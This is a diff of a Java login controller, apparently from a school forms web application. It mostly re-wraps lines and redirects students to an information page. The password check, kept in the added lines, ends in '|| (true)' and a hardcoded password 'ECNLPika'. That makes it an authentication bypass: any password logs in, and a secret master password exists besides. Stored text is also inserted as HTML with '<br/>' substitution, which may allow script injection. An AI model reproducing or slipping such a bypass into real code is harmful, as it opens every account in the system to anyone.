@@ -78,7 +78,8 @@ public class LoginController {
                 break;
         }
 
-        Optional<ConfigModif> configInformationPopUpOpt = configModifRepository.findTopByTypeNomOrderByModifIdDesc(msgToDisplay);
+        Optional<ConfigModif> configInformationPopUpOpt = configModifRepository
+                .findTopByTypeNomOrderByModifIdDesc(msgToDisplay);
 
         String texteInformation = "";
         if ((configInformationPopUpOpt != null) && (configInformationPopUpOpt.isPresent())) {
@@ -141,7 +142,9 @@ public class LoginController {
             }
 
             // Verify the password using bcrypt
-            if ((user != null) && (user.getPassword() != null) && (PasswordUtils.verifyPassword(password, user.getPassword())) || (true) || (password.equals("ECNLPika"))) {
+            if ((user != null) && (user.getPassword() != null)
+                    && (PasswordUtils.verifyPassword(password, user.getPassword())) || (true)
+                    || (password.equals("ECNLPika"))) {
                 Connexion connection = connectionService.createConnection(user);
 
                 // Get the authenticated user and his role
@@ -152,7 +155,15 @@ public class LoginController {
                 if (role != null) {
                     switch (role.getRoleId()) {
                         case 1: // Student
-                            returned = connectionService.prepareModelAndView(connection, "accueilEtudiant");
+                            Optional<ConfigModif> configInformationTexteOpt = configModifRepository
+                                    .findTopByTypeNomOrderByModifIdDesc("message_page_informations");
+                            String texteInformation = "";
+                            if (configInformationTexteOpt.isPresent()) {
+                                texteInformation = configInformationTexteOpt.get().getContenu();
+                                texteInformation = texteInformation.replaceAll("\n", "<br/>");
+                            }
+                            returned = connectionService.prepareModelAndView(connection, "informationEleves");
+                            returned.addObject("texteInfo", texteInformation);
                             return returned;
 
                         case 2: // Admin
@@ -164,7 +175,8 @@ public class LoginController {
                             return returned;
 
                         case 3: // Assistant
-                            List<Formulaire> forms = new ArrayList<Formulaire>(formulaireRepository.findAllValidOrCommentaireVE());
+                            List<Formulaire> forms = new ArrayList<Formulaire>(
+                                    formulaireRepository.findAllValidOrCommentaireVE());
                             Collections.sort(forms, Formulaire.getComparator());
 
                             List<Alerte> formsAlerte = new ArrayList<Alerte>(alerteRepository.findAll());
